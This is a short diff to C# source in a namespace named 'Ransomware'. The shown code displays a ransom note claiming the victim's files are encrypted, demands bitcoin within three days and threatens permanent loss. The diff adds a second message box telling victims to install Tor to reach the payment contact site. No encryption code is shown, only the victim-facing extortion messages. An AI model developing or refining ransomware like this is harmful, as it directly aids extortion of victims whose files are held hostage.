@@ -78,7 +78,9 @@ namespace Ransomware
             }
 
             string message = $"Ooops! :(       All your files have been encrypted with a military grade encryption password. To get the password, send me <money #> to this bitcoin address. : <Bitcoin Address>. Once you have sent the money, send me a message at <website> with the transaction ID of ({transactionId}) and you will get the password to decrypt your files. You have 3 days to do so, after which the password will no longer be accepted, and you cannot decrypt your files anymore! Do not try and restart your computer, and if you do, you'll regret it very much.";
+            string message2 = $"In order to reach the website where you'll be able to privately message us, you'll first have to install Tor from https://www.torproject.org/, and then navigate to the provided website once you have sent us the money.";
             MessageBox.Show(message, "Message Box Title", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000 | MessageBoxOptions.ServiceNotification);
+            MessageBox.Show(message2, "Message Box Title", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)0x40000 | MessageBoxOptions.ServiceNotification);
 
 
 
